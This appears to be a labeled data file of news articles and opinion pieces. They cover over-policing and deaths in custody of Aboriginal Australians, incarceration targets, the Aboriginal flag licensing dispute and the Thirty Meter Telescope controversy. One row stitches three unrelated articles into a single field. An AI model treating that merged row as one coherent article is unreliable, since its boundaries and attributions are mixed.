1,"Over-policing traps Aboriginal Australians in the criminal justice system, but it’s hard to get a handle on the problem Aboriginal Legal Service chief executive Karly Warner remembers sitting in a Victorian courtroom during one of her first cases as a lawyer in about 2014 and thinking “what are we doing here?”. “It was for a young [Indigenous] person who had stolen a chocolate bar,” she told Guardian Australia this week. “And I remember, in that moment, just thinking why have we got this young person, taken out of school, not with their friends, their community, not safely with their family, why have we brought them into this formal court setting, using a bunch of taxpayer money, when instead we could very easily be putting things in place to support this child? “I mean, it’s a chocolate bar, and they’re a kid who’s hungry. I still remember just thinking ‘why?’.” The Black Lives Matter protests that swept the globe following the death of George Floyd at the hands of police in the US have cast a rare spotlight on the way Indigenous people are treated in Australia’s justice system. Last weekend, tens of thousands of people across the country defied warnings from MPs and health officials to march in solidarity with the movement, protesting against police brutality. Senior figures both in governments and the police have walked a careful line between acknowledging unequal treatment of Indigenous people in the justice system and attempting to distance Australia’s history from the US. In an interview this week the prime minister, Scott Morrison, said it was a “fair point” to raise issues about “people’s treatment in custody or things like that”, but then incorrectly claimed “there was no slavery in Australia”. Similarly the New South Wales police commissioner, Mick Fuller, dismissed anti-police sentiment as the result of “something that happened in another country” in Sydney tabloid the Daily Telegraph. But despite those attempts to deflect criticism, the Guardian this week revealed an extraordinary disparity in the way Indigenous Australians were treated when caught with small amounts of cannabis. In NSW, police took 82.55% of all Indigenous people found with a non-indictable quantity of cannabis to court. The rate was 52.29% for the non-Indigenous population. The state also has a cannabis caution regime, designed to keep people out of the justice system for such minor offences. The cautions are issued at the discretion of individual police. Only 11.41% of Indigenous Australians found with cannabis were let off with such cautions, compared with 40.03% for non-Indigenous people. More detailed analysis shows the trend is more pronounced in greater Sydney, where 86.42% of Indigenous Australians caught with low-level amounts of cannabis were taken to court, compared with 46.12% for non-Indigenous offenders. In regional NSW, 80.57% of Indigenous Australians were taken to court for such offences. The rate was 63.73% for non-Indigenous people. About 12.07% of Indigenous Australians caught with cannabis in regional NSW received a caution, significantly less than the 27.52% of non-Indigenous offenders. There are, of course, limits on when and how cannabis cautions can be issued. Anyone with a history of drug offences, sexual offences or any offence involving violence is ineligible, and police can only give two warnings per individual. But Warner questioned why the restrictions around the scheme still existed if it was leading to “discriminatory” outcomes. “If we have got people who are essentially being charged for small amounts of cannabis and not receiving cautions and the police are saying ‘this is because of existing legislation’, why have we not changed the legislation?” she said. “If that legislation is by their own admission resulting in discriminatory outcomes where Aboriginal and Torres Strait Islander adults are less likely to receive a caution than non-Aboriginal people, why has there not been reform to get rid of that systemic discrimination?” She said even interactions with the justice system for minor offences increased the chances of Indigenous people being caught in the “quicksand” of the justice system, which could lead to incarceration. “The thing is, systematic racism is not someone else’s problem,” she said. “It’s our kids, it’s our mums and our dads [and] we all know that once people have that contact with the justice system they are just so much more likely to get stuck in that quicksand.” Cannabis offences are far from the only example of disparity in police enforcement, but significant failures in the transparency of Australia’s justice system mean that in most states and territories the data is only piecemeal. University of Technology Sydney professor Thalia Anthony, a leading voice on Indigenous justice issues, found similar trends for traffic offences such as driving unlicensed or driving unregistered. In Western Australia, Aboriginal drivers received 3.2 times more fines after being pulled over than non-Aboriginal drivers, according to data obtained by the Guardian from an internal police briefing note that described the disparity as “clearly disturbing”. Other data has shown Indigenous Australians were remarkably over-policed for public nuisance offences in Queensland. In 2017, University of Queensland professor Tamara Walsh obtained data showing about one in four of all adults and more than 40% of children charged with public nuisance were Indigenous. Only about 3.5% of the Queensland population is Indigenous. The consequences of over-policing cannot be overstated, according to the Public Interest Advocacy Centre (Piac), a not-for-profit legal service that works to change policing practices disproportionately impacting Indigenous people. Piac principal solicitor Camilla Pandolfini said the research clearly shows that the earlier a young person is involved in the criminal justice system, the more likely they are to be entrenched. Pandolfini said the high rate of incarceration for Indigenous Australians can only be reversed by tackling every decision made “at every step of the criminal justice system”. That includes decisions by police on who they target, who they stop and search, and who they offer warnings, cautions, and other diversions away from the courts. “Research consistently shows that the earlier a young person is involved with the criminal justice system, the more likely they are to become further involved in that system,” she said. “Bringing young people before the court for minor offending risks entrenching them in the criminal justice system.” None of this is new to Julie Tongs, the chief executive of the ACT’s Winnunga Nimmityjah Aboriginal Health Service, which does outreach in Canberra’s jail and runs drug counselling and support programs. She still remembers 40 years ago, when her children were targeted by police as they came home from school. “If there was a group of black kids and a group of white kids, or a mixture of both going home from school, they’d target the black group,” Tongs said. “They still do, and go through their backpacks and stuff like that.” Tongs says the disparity of treatment is not isolated to policing. It’s also replicated in the courts, she says. “All this stuff that’s been happening overseas, we’re a fairly placid mob, compared to over there,” Tongs said. “But we’ve got a lot of very angry young people and there will be an uprising. I really believe there will be a riot at this jail any day because of the racism.” Despite the ramifications of over-policing, there remains a paucity of data, publicly at least. Most police forces do not release detailed breakdowns of their interactions with Indigenous Australians, NSW being a notable exception. In Victoria, despite a commitment to begin mandatory recording of ethnic appearance descriptors in police interactions with the public, the force has refused to make the data public. In a statement this week, Victoria police told the Guardian there was “considerable community concern and risk associated with the reporting of ethnicity data”. “Victoria police has in the past consulted with community representatives around the topic of ethnicity data collection,” a spokesperson said. “Some supported the collation of ethnicity data, while others cautioned it could lead to community harm.” Researchers like Anthony have had to fight for information, or otherwise rely on media reporting, like the Guardian Australia’s Deaths Inside project, a count of Indigenous deaths in custody. “I think it’s conscious, the withholding of data, because the police collect it but they don’t want that oversight. “They don’t want that interrogation by the public, because it makes them accountable. “So I don’t think it’s an accident or negligence, I actually think there’s a deliberate withholding of data.” Walsh has also had enormous difficulty accessing police data. She said academics were asked to sign deeds around how they would use the information before it was released, and that it was virtually impossible for the public to navigate the system. “You do get to the point where you come to the conclusion that it’s deliberate, that this is essentially a cover up,” she told Guardian Australia. with Josh Taylor"
1,"Anger over the police-related deaths of George Floyd and other people of color has translated into protests around the world, including Australia. On Saturday, thousands marched across Sydney, Melbourne, Brisbane, and Adelaide, in a united stance against police brutality and racism. Some held signs reading ""Indigenous lives matter"" or ""Same problem, different soil."" Ruby Wharton, who spearheaded the demonstration in Brisbane, said she wants Australians to see the connection between the Black Lives Matter movement in the US and the plight of Indigenous people in their own country. ""We are taking a step back and looking at the issue for what it really is,"" Wharton, a coordinator for Warriors of the Aboriginal Resistance, told Insider. ""That black people had to die in order for communities across the world to come together."" Wharton was one of dozens of at a vigil Wednesday in Musgrave Park, where the words ""I can't breathe"" were spelled out in 433 candles, symbolizing the 432 Indigenous Australians reported to have died in custody since 1991. The 433rd candle, Wharton said, was for George Floyd.  The images of unrest coming from the United States have given Australians an opportunity to reflect on police brutality against the Aboriginal community, activists say, and have reignited the debate on why it hasn't received a similar reckoning. ""There's so many modern parallels with what's going on in Australia and the United States,"" Sudanese-Australian activist Yassmin Abdel-Magied told CNN. ​""It's the same institutionalized racism, it's the same black deaths in custody and police getting away with it with impunity."" In November 2015, David Dungay, a 26-year-old member of the Dunghutti people, died while in a Sydney prison hospital. Officials stormed his cell after Dungay, who was schizophrenic and diabetic, refused to stop eating a bag of cookies. They dragged him into an observation room, where at least four guards held him facedown. Echoing George Floyd's plea, Dungay said ""I can't breathe"" 12 times before losing consciousness and dying. But, unlike Floyd, his death was not followed by nationwide protests. In 1991, the Royal Commission into Aboriginal Deaths in Custody determined 99 Indigenous people had died in custody between 1980 and 1989. It made hundreds of recommendations for preventing loss of life —including improved access to records, better medical assistance, an end to racist language against Aboriginal people, and incarceration only being used as a last resort. But few of the suggestions have been implemented in the past three decades. In that same timeframe, no officer has been convicted of killing an Indigenous person in custody. In 2004, a coroner in Townsville, Queensland, determined that an officer had caused the death of an Indigenous man found dead in his cell. She testified Senior Sergeant Chris Hurley punched David Doomadgee in the jaw and continued to pummel him on the ground, according to the BBC. No attempt was made to resuscitate Doomadgee or later investigate his death. Queensland Police Union president Gary Wilkinson dismissed the coroner's testimony, insisting it came from ""unreliable evidence from a drunk,"" the BBC reported. A jury acquit Hurley on manslaughter and assault charges in less than four hours, the Australia Broadcasting Corporation reported. Doomadgee's death was followed by rioting on Palm Island, where he lived. Hurley's home and the Townsville courthouse and police station were burned down. In response, 80 riot police in ski masks were flown in, armed with guns and tasers. They barged into residents' homes and arrested more than two dozen. In 2016, the raid was found to be in violation of the Racial Discrimination Act. For David Dungay's nephew, Paul Francis-Silva, it's hard not to compare what happened to his uncle to the tragedy of George Floyd. And hard not to feel like more needs be done. ""We really do feel for the family over in the US, because we do know how it feels to actually watch a video clip of a loved one being suffocated to death,"" he told The Guardian. ""We need to be just as outraged with what's going on in our own backyard."" Though only about 2% of Australians identify as Aboriginal or Torres Strait Islander, Indigenous adults are 15 times more likely to be incarcerated than non-Indigenous Australians, according to a 2018 report from the Australian Bureau of Statistics. That same year, the Australia Institute of Health and Welfare reported that Indigenous juveniles were 26 times more likely to be in detention than their non-Indigenous peers. The issue of police violence returned to the fore on Monday, when a video surfaced online of an unnamed Sydney constable slamming an Indigenous teen face-first into a brick sidewalk after the youth told the officer he would ""crack you across the jaw, bro."" While the clip sparked outrage — and led to the constable being put on restricted duty — New South Wales Police Commissioner Mick Fuller said the officer ""had a bad day"" and shouldn't be fired ""after making such a commitment to the community."" NSW police minister David Elliott also defended the constable, saying he was ""horrified"" by the teen's language. Young people, he added, need to learn ""there are levels of authority there that really command respect."" But New South Wales Premier Gladys Berejiklian told reporters the video showed ""we still have a long way to go in our country."" ""I think what's happened in the US is a good wake-up call for all of us,"" she said. ""All of our hearts are breaking as to what's happening in the United States, and we certainly have to ensure that we do what we can in our own country to protect all of our citizens."" Australian Prime Minister Scott Morrison on Friday asked people to avoid the rallies over public health concerns. Then the New South Wales Supreme Court ruled the Sydney gathering was in violation of current coronavirus restrictions. Protesters won an appeal just hours before the event was slated to begin. Many had vowed to go forward regardless of whether the demonstration was legally sanctioned or not. ""Black lives matter and we are not going to stop, we are going to march,"" David Dungay's mother, Leetona, told SBS News on Friday. ""We don't care what an act of law says, because those acts of law are killing us,"" she said. ""I'm marching for my son, and nothing is stopping me.""  Keep reading"
1,"Please note this story contains reference to people who have died. Moral outrage is an interesting thing. I’ve seen plenty of posts, reposts, stories, and comments on social media about the atrocity that was the George Floyd murder and the continued systemic racism that’s ever-present in the United States. It has become obvious that many are simply brushing over the problems in our own backyard. It has become obvious that many have forgotten or simply chosen to ignore the same last words of Dunghutti man, David Dungay Jr, as he was held down and sedated by prison guards: “I can’t breathe.” It has become obvious Australia likes to assume moral superiority when it comes to race, despite the fact that First Nations outcomes are disgraceful in this country. Our own Prime Minister chose to ignore the systemic issues I’m sure he knows remain prevalent across the country, saying on live radio on Monday he thought to himself, “how wonderful a country is Australia?” when thinking of the widespread protests across the States right now. “But when I see things like [what’s happening in the US], I’m just very thankful for the wonderful country we live in,” he said. How embarrassing that Scott Morrison thought it appropriate to pretend Australia is a utopia of equality. Such blatant feigning of ignorance is the height of poor leadership. Australia is wonderful, Australia is ‘the lucky country’—but only for some. It remains undeniable that Australia has a sinister past of colonial massacre fed by deep roots of white supremacism. It remains evident in our incarceration rates, our suicide rates, our health equity rates. First Nations Peoples are monstrously overrepresented in these areas despite making up approximately three percent of the population. The Australian Bureau of Statistics tells us that at June 30, 2019, over a quarter (28 percent) of the prison population were First Nations. The latest youth justice report from the Australian Institute of Health and Welfare (AIHW) found half the children aged 10-17 under youth supervision were First Nations, despite making up only six percent of that age group nationally. Since the Royal Commission into Aboriginal Deaths in Custody handed down its 339 recommendations in 1991, 432 First Nations people have died in custody. One third of these recommendations have still not been implemented and no police officer has ever been convicted of a black death in custody. Yet Scott Morrison is “thankful” for his country. He’s not thankful for Australia, he’s thankful he’s white. “The clear fact is that there are and there have been recent Aboriginal deaths in custody, and that’s a serious issue,” said Shadow Minister for Indigenous Australians, Linda Burney, to NIT on Monday. “Clearly the recent death in America has tapped into something much deeper.” And she’s right. Australia and the United States share the same racist foundation that built up the countries to what they are today. It’s a vicious undercurrent that routinely flares up around January 26, Reconciliation Week and NAIDOC Week in Australia. It was only weeks ago a Nine News report returned to the paternalistic thinking of the past by producing a story on what Palm Island residents were spending their compensation money on from the 2004 Palm Island riots over the death of Mulrunji Doomadgee. This was money that was received after a court found the excessive force used by Queensland Police during the riots was racially motivated. Nine reported the story as if First Nations individuals don’t have the same agency to choose where, what and who they spend their money on as non-First Nations individuals. It’s this kind of racist undercurrent that is present everywhere in Australia and the US. In the US, it flares up every time a police officer blatantly murders an African American. It flares up every February: Black History Month. And it flares up every time the current President opens his mouth to incite violence—“when the looting starts, the shooting starts”. I wonder if it’s the distance between Australia and the United States that makes it easier for people to be outraged from afar instead of fighting against something so real and so close to home. The distance allows us to show our superficial support to Black America’s plight while remaining complacent and complicit to the human rights injustices occurring daily in our own communities. The further removed you are from a situation, the easier it becomes to insert your opinion without having to remember these are real people and real lives being affected. So, while Australians get angry about America from a distance, Australia’s First Peoples are still dying too early, still surviving systemic persecution, and still living in a country where easily fixed inequalities are rampant.

1,"National cabinet meets on Friday to discuss targets, but it’s also crucial to address the underlying drivers of offending and imprisonment A common thread has been running through the beginning of 2020: the need for community strength and resilience. When the devastating bushfire season made thousands of people homeless, everyday Australians reached out to support those in need, donating money, food, clothing and time. When the coronavirus pandemic hit, people came together and did the tough task of staying home to protect our most vulnerable. Aboriginal and Torres Strait Islander communities demonstrated leadership and resilience, in some cases acting swiftly to close their communities before governments had acted to do so. Following the killing of George Floyd in the United States, we saw Australians again come together in a different way – on the streets, and online – in a strong demonstration of anger over the deaths of black men and women in Australian prisons and police custody, and the systemic racism and disadvantage at the heart of our system. Australia’s First Nations communities know a lot about resilience – a resilience fired in the forge of dispossession, disempowerment and discrimination, a resilience that has sustained their advocacy and calls for change in the face of the government’s continued inaction. We first proposed targets to reduce incarceration back in 2006. It wasn’t until 2018 that Coag announced it would consider draft incarceration targets as part of the Closing the Gap “refresh” and now, 14 years after we first called for them, there is a draft plan to include very modest targets, to be discussed at national cabinet on Friday. Our governments now need to be serious about this issue. Any targets should be ambitious, and the effort sustained. Lives depend on it. To meet these targets we need coordinated legislative and policy reforms and a commitment to shifting power and resources. The 2017 Australian Law Reform Commission’s Pathways to Justice report delivered a blueprint for these reforms, to be underpinned by a justice reinvestment approach. More than three years later, with the exception of the ACT, governments have again failed to act. The levers of change need to go beyond the criminal justice system. It is crucial to address the underlying drivers of offending and incarceration, including intergenerational trauma, poverty and inadequate access to essential services such as housing, health and education. This path towards a just justice system is what we all want – where we live in resilient and caring communities and young people can lead full lives. We all have a role to play in recognising the racism and other forms of discrimination embedded in our systems and then take action to challenge and dismantle them. The problems extend beyond the police and criminal justice system and into other areas such as health, housing and education. School discipline policies result in disproportionately high numbers of First Nations children being excluded from their education. This pushes them out towards contact with police and the criminal justice system, and a punitive policing model that results in far too many Aboriginal children and young people being locked up. While we wait for governments to act, First Nations communities are stepping in to the void to create futures for their kids, working tirelessly to build safe and strong communities. They are working to shift the conditions that have seen too many of their children and young people get caught up in the criminal justice system. The Murri School in Brisbane is an Indigenous-owned and controlled independent school widely recognised for its success. Established in 1986, it currently educates over 270 students, 95% of whom are Indigenous. The school delivers a wholistic suite of programs centred on the education of their students, which includes a focus on their health, comprehensive family support and “at school” meals to address those underlying issues that generally impact negatively on education outcomes. It is a community-led solution delivering results for our young people. In 2013, the town of Bourke in New South Wales became the first major site in Australia to implement community-led justice reinvestment. Maranguka is driving change toward their community agenda Growing our Kids up Safe, Smart and Strong. An impact assessment by KPMG reported outcomes including a 23% reduction in police recorded rates of domestic violence, a 31% increase in Year 12 retention, and a 42% reduction in days spent in custody. With a focus on sustaining these outcomes, Maranguka is now working towards building a First Nations model of self-governance. We have long championed community-led justice reinvestment as the key to addressing the over-incarceration of First Nations people. This was echoed in the Australian Law Reform Commission’s Pathways to Justice report, which recommended support for other communities looking to work in a similar way to Bourke. It is becoming increasingly clear that in order to build strong and resilient communities, governments must invest in and support solutions that are led and owned by communities. This is true whether we are meeting environmental challenges such as bushfires, health challenges such as pandemics or social challenges such as community wellbeing. The Black Lives Matter protests have brought people together from across the spectrum of society, not only in frustration and anger but also to express solidarity and hope for a brighter future in which our children are safe to thrive. The way to unlock that future is through community-led solutions. Professor Tom Calma AO is from the Kungarakan and Iwaidja tribal groups. He is chancellor of the University of Canberra and co-chair of the senior advisory group of the Indigenous Voice co-design process (taking leave as co-chair of Reconciliation Australia). Mick Gooda is an Aboriginal man of the Gangulu people. He was co-commissioner of the royal commission into the protection and detention of children in the Northern Territory from 2016 to 2017.

This was published 1 year ago Western Australia has recorded a third Aboriginal death in custody within two months after an inmate died in Roebourne Regional Prison on Wednesday morning. In a statement, the Department of Justice said the 47-year-old man had been found unconscious by prison officers in his six-person dormitory cell. The health centre at Roebourne Regional Prison.Credit:OICS But despite efforts by medical staff and paramedics, the man could not be revived. His death comes less than three weeks after a 19-year-old man died by suicide five months into his jail term at Acacia Prison, in Wooroloo, an hour east of Perth. Stanley, whose surname WAtoday has chosen not to publish at the request of his family, had been struggling with mental health in the lead up to his death, raising concerns among his loved ones that his calls for help had gone unanswered. The 19-year-old, described by his family as a budding Aboriginal artist and caring uncle, was sentenced in Fremantle Magistrates Court to two years jail for burglary-related offences committed in February. With parole, he could have been released in six months. Stanley's death follows an incident at the same jail a month earlier, where a 40-year-old Aboriginal man died after collapsing at the privately owned prison. His death was deemed not suspicious. At the same time, thousands gathered across Australia to show solidarity with the Black Lives Matter movement and call for an end to Aboriginal deaths in custody. The Department of Justice said the death at Roebourne Prison did not appear to be suspicious but it would be subject to a department review and a Coroner's inquest. ""Corrective Services Commissioner Tony Hassall has extended his condolences to the man’s family and is travelling to Roebourne today,"" a department spokesman said. ""Support will be offered to the family of the prisoner and other prisoners at the site. ""In responding to this Indigenous death in custody, the department will seek cultural advice from community elders."" Since the 1991 Royal Commission into Aboriginal Deaths in Custody, 236 people have died in WA. Of those, 84 have been ruled unnatural – mostly suicides – and 48 are still pending a coronial inquest. Curtin University senior Indigenous research fellow Dr Hannah McGlade said the high rate of Aboriginal deaths in custody in WA required urgent political attention. ""It is extremely disappointing that neither the state or federal governments are responding to this crisis,"" she said. ""Australia has signed the Optional Protocol on the Convention Against Torture but the monitoring mechanisms that do exist, are known to be ineffective. ""The Office of the Inspector of Custodial Services condemned the state of Roebourne Prison only recently for its appalling conditions, but has the Corrections Minister responded?"" Roebourne Prison made headlines earlier this year after a report by a custodial services inspector described the cells as being infested with rats and snakes. It also said high temperatures inside the prison, reaching up to 33 degrees celsius at night, posed a threat to the health and safety of inmates. The report came three years after the OICS found the Pilbara jail was decrepit, with intolerable and inhumane living conditions caused by the extreme heat. ""It is very clear that the monitoring mechanisms need to be culturally appropriate and they are not, so Aboriginal people understandably have a lack of confidence in OICS,"" Dr McGlade said. ""Aboriginal people are dying in prisons in WA in this way for a reason, and the state cannot continue to avoid and neglect its duty to the lives of Aboriginal prisoners.""

This was published 1 year ago Last year it was ABC journalist and author Leigh Sales who copped it at Perth's Disrupted Festival of Ideas, this year conservative Alice Springs politician Jacinta Price seems likely to be on the receiving end of the controversy. WA's State Library has confirmed Ms Price has been booked as a keynote speaker for this year's event, and acknowledged her involvement might upset local Noongar people. Jacinta Price is a Warlpiri/Celtic woman who grew up in Alice Springs.Credit:Facebook But State Librarian Margaret Allen backed the move to invite Ms Price, saying the Disrupted Festival was about debate and exchange of ideas, not about everyone agreeing. Ms Price is an outspoken Aboriginal conservative, an Alice Springs councillor and the director of the Indigenous program at the Centre for Independent Studies, a libertarian think tank. She is the daughter of former NT minister Bess Price and a controversial figure for many Aboriginal Australians for her views on domestic violence and child protection in Indigenous communities. ""Yes, we are aware that Jacinta Price is potentially disruptive but that is exactly why we have chosen to invite her to this festival,"" Ms Allen said. ""The State Library does not believe in censorship or that Ms Price has crossed a line, which means her views should not be aired or given a platform. ""We acknowledge that the local Noongar community does not share this view."" This is not the first time Ms Price has faced controversy ahead of a scheduled public speaking event. In September 2019, NSW traditional owners called for Ms Price's Mind the Gap Tour event in Coffs Harbour to be cancelled, saying the Alice Springs councillor was ""not welcome"". In a statement a group made up of nine local Aboriginal organisations said Ms Price had vilified Aboriginal peoples and cultures for years and ridiculed their ""compounding pain and suffering"". Ms Price fired back at critics, saying the group's move was ""political correctness gone absolutely bonkers"" and adding she would not request permission from elders to enter Australian land. Ms Allen said journalist Stan Grant would be another keynote speaker at this year's event, who would likely ""provide a different opinion to Jacinta Price"". ""We will also invite members of the local Noongar community to join Jacinta on a panel to discuss her ideas,"" she said. ""Libraries best serve their communities when they openly and freely support citizens in accessing and understanding information of different kinds, even when this information may include views that are considered controversial."" Ms Allen said while Ms Price had accepted the invitation to speak at the festival she was unlikely to attend due to COVID-19 restrictions limiting interstate travel to WA. Ms Price was contacted for comment. The free Disrupted Festival of Ideas will take place at the State Library of WA on November 7. This year's festival will be centred around the theme 'A Better World' and include activities for children, music performances and panel discussions. Copyright © 2022"
1,"Majority of leagues’ clubs have joined ‘free the flag’ campaign to petition government to help resolve issue with non-Indigenous licence-holders The AFL has been hit with a bill for its past use of the Aboriginal flag on merchandise produced during the Indigenous round, and this has been a factor in its decision not to enter into an agreement with the non-Indigenous owned company who have a worldwide exclusive licence to the flag. The admission comes as 16 of the AFL’s 18 clubs have signed on to support the “free the flag” campaign set up to petition the government to help resolve the issue. The flag’s designer, Luritja artist Harold Thomas gave a worldwide exclusive licence to a non-Indigenous owned company called Wam Clothing, which has been actively enforcing its rights since the agreement was announced in November 2018. The AFL’s Inclusion and social policy manager Tanya Hosch said that Wam Clothing has sought a “legal resolution” to the AFL’s past use of the flag on its merchandise, particularly club jumpers. “Typically in the past, the Aboriginal and Torres Strait Islander flags have been printed on those jumpers,” Hosch said. “So WAM Clothing as part of the licence agreements, have asked for a legal resolution to the use of the flag on merchandise retrospectively, although I don’t know how far back.” Hosch spoke to Guardian Australia from Darwin on the eve of the Indigenous round game between Essendon and Richmond on Saturday, which will be played in honour of pastor Sir Douglas Nicholls. Hosch said the Indigenous round jumpers, which have been produced since 2012, had traditionally been sold to raise money for Indigenous programs. “So there is an outstanding issue there, in relation to the way the flag has been represented on our merchandise,” she said. “There is an agreement that any profit from the sale of those particular jumpers go into a fund to support Indigenous football programs. And those artists don’t get royalties on their artwork, knowing that the money goes into Aboriginal football programs.” The AFL decided not to engage with Wam Clothing based on advice it received from its Aboriginal and Torres Strait Islander Advisory Council, chaired by Paul Briggs. Earlier this year, the council advised the AFL not to enter into a licence agreement “in line with Aboriginal community sentiment about an official flag of our country,” Hosch said. Hosch said it was a really important emblem that has meaning for all Australians. “And to feel that now, the extra hurdles to jump through to actually make use of that in an appropriate way, to demonstrate community and cultural pride, it’s really bad, and to those people working hard behind the scenes to try and bring resolution to this issue for the good of the whole nation, I wish them well.” The minister for Indigenous Australians, Ken Wyatt, said the issue is “extremely complicated” and his agency has been in “quiet discussions” about ways to resolve it. Wyatt told 6PR in Perth the government has the power to compulsorily acquire copyright, but he is reluctant to take that path. It could cost the government millions to buy out the copyright, he said. “I think someone put forward a figure of $25m based on the boxing kangaroo costing the Sydney Olympic Committee $13m at the time. But I suspect there are much more complex issues when you enter into licensing arrangements,” Wyatt said. “But I don’t want to go down a pathway where we legislate to take away the copyright of an individual, because we know that we can do it to anybody.” Wyatt told the ABC earlier this week that “it is unfortunate that some common sense has not prevailed.” In 2019 the minister ruled out the option of buying out the copyright after meeting with Harold Thomas. Guardian Australia understands discussions have been had with Thomas and Wam Clothing since then, without resolution. Wyatt is encouraging people who attend the weekend’s game to take their Aboriginal flag along and “carry it with pride”. Wam Clothing has previously issued “cease and desist” notices to several companies, including the AFL and Indigenous companies, and demanded payment for the use of the flag, even from charities. A campaign to “free the flag” has gathered momentum in the run-up to this weekend’s games, with 16 AFL clubs now expressing an interest in their players wearing T-shirts bearing #freetheflag slogans during training sessions and pre-match warmups. The campaign is backed by Olympic gold medallist and former senator Nova Peris and former Essendon player Michael Long, who said the situation was a “disgrace”. Laura Thompson, the managing director of Clothing the Gap who has been leading the Free the Flag campaign for the past 12 months, said she had faith in the power of sport to effect social change. “We really hope this is a tipping for the government to take action and do what’s right for Aboriginal people and for all Australia to have the same flag rights,” she said. Wam Clothing has been sought for comment."
1,"The Canadian astronomy community has named the controversial Thirty Meter Telescope its top facilities priority for the decade ahead while also recommending the creation of a policy focused on Indigenous consent in a section of its new long range planning document. The telescope, proposed for construction on Hawaii's tallest mountain, Mauna Kea, has sparked opposition and widespread protest from Kanaka Maoli, the Indigenous People of Hawaii. Canadian astronomers' commitment to the telescope has forced the community to contend with the tension between its scientific ambitions and how it navigates questions about Kanaka Maoli consent. They successfully lobbied the federal government to commit $254.5 million in funding toward the project in 2015. If built, TMT would be among the largest telescopes in the world. A fact-pack on the TMT website says the telescope will ""help answer fundamental questions about the universe"" will likely lead to discoveries that can't be anticipated today. Astrophysicist Sara Ellison, president of the Canadian Astronomical Society (CASCA), said ""it's not our decision to make"" when asked what role Canadian astronomers have to play in answering questions about Kanaka Maoli consent and TMT's future on Mauna Kea. CASCA is a professional body that represents astronomers in Canada and publishes a long range plan every 10 years. ""It is for the Native Hawaiians and the State of Hawaii to decide whether we're welcome. And if we're not, we won't go,"" said Ellison. Ellison said extreme efforts and good will went into the consultation process on TMT and said it had support from the Office of Hawaiian Affairs, a political body that represents Kanaka Maoli. The office voted to withdraw that support in 2015. Uahikea Maile, a Kanaka Maoli scholar and professor of Indigenous politics at the University of Toronto, said framing TMT as an internal Hawaiian matter is a way for Canadian astronomers to ""distance themselves from the kinds of ethical quandaries of dealing with humans and human populations."" ""When, in fact, in order to study the stars and the universe and other universes they have to contend with people on our own planet."" Maile has been advocating for Canadian divestment from the project and working to educate people about Kanaka Maoli perspectives about astronomy and Mauna Kea. Peaking at 4,200 metres above sea level, the dormant volcano is sacred to Kanaka Maoli. Its elevation and atmospheric conditions also present an ideal location for stargazing. Thirteen observatories have been built on the mountain since the 1960s. Maile said the TMT conflict is often framed as a clash between culture and science, but that it's really ""a territorial, jurisdiction issue"" — one that has arisen because of colonialism in Hawaii and the limited decision-making authority his people have on the mountain. Sara Ellison describes TMT as a ""lightning rod"" on Mauna Kea that's about more than any single project and that the conflict has made it a difficult time to be an astronomer. ""Some of us have been real targets of animosity… within our own university communities and further afield as well, that we are somehow to blame for police violence against Native Hawaiians,"" she said. She doesn't agree with the comparisons that have been drawn between the telescope and pipeline conflicts. ""With pipelines, businesses have something they really want to extract and have something to gain,"" she said. When it comes to astronomy, she sees her field as ""a gain for all of mankind."" ""We're all asking questions about our origins and I think there's actually quite a deep connection there with Native beliefs in terms of ways of learning about our past,"" she said. Maile said it's offensive to hear astronomers make a ""bizarre connection"" between their pursuit of knowledge and Kanaka Maoli culture. ""It is very clear to me that Canadian astronomers, after all my meetings, care more about finding alien life and discovering planets that are habitable for humans outside of our solar system than Indigenous rights and Indigenous Peoples on ours,"" he said. TMT's external relations vice-president Gordon Squires said in an emailed statement to CBC News that ""consent in Hawaii is a complex issue, as there is no single, recognized decision-making authority for the native Hawaiian population."" He wrote that TMT has gone through all the necessary processes and has met Hawaii's legal requirements to allow for construction and that ""there is significant support for the TMT Project, including among native Hawaiians."" Maile said there's a plurality of perspectives among Kanaka Maoli when it comes to TMT but that there's evidence to show that Kanaka Maoli don't consent to its construction. ""Evidence of no consent from my people would be for decades having opposition to ongoing industrialization of Mauna Kea and other mountains in Hawaii,"" he said. ""Kanaka Maoli say enough is enough and have shown up in force to say no,"" he said. In many ways, Mi'kmaw astronomer and University of Toronto professor Hilding Neilson straddles both sides of the conversation about TMT and Mauna Kea. He submitted white papers to CASCA to inform the long range plan, including one about astronomy on Mauna Kea that included recommendations about how Canadian astronomers can better support Indigenous rights. ""Most of the people in Canadian astronomy have very little insight or idea of what it means to be Indigenous or Indigenous issues in Canada or Hawaii,"" he said, though he said he finds it promising that many in his field are embracing the conversation about the ethics around facilities and Indigenous Peoples. Pauline Bramby, astronomer and co-chair of the panel that wrote the long range plan, said she hopes the section calling for the creation of a policy on Indigenous consent will prompt bigger conversations among astronomers, ""where we reflect on the kinds of privileges we have as astronomers and how those privileges are informed by the history of colonialism."" ""I think we've had a feeling in our field that because we don't build bombs and blow up people and everybody loves space that astronomy isn't a controversial field — it's kind of a blame-free field. And I think many of us are starting to realize that that's not quite the case."" She said TMT is a big part of why recommendations about Indigenous consent were written into the latest report but that a set of guiding principles would also be helpful for astronomers considering sites for ground-based facilities in other parts of the world. While the long range plan recommendations about Indigenous consent send the ""right message,"" Neilson worries that ""it's not clear who is responsible for implementing that spirit and that message. So it could also end up being all for naught."" When asked if there's something he could compel his astronomy colleagues to understand, he responded: ""We benefit from stolen land."" ""Every image, spectrum, beautiful telescope picture we got — taken from Hawaii — is based on stolen land. We might have permission to be on there by the State of Hawaii and various lease agreements, but at this point no Native Hawaiian community has ever given us that consent, as far as I know."" Construction of the Thirty Meter Telescope remains on hold. Mauna Kea remains the preferred site for construction, though a site in the Canary Islands has also been identified as a potential backup. Cost estimates to build the telescope are currently in the ballpark of $2.4 billion. The National Science Foundation is currently reviewing a funding proposal for the project.

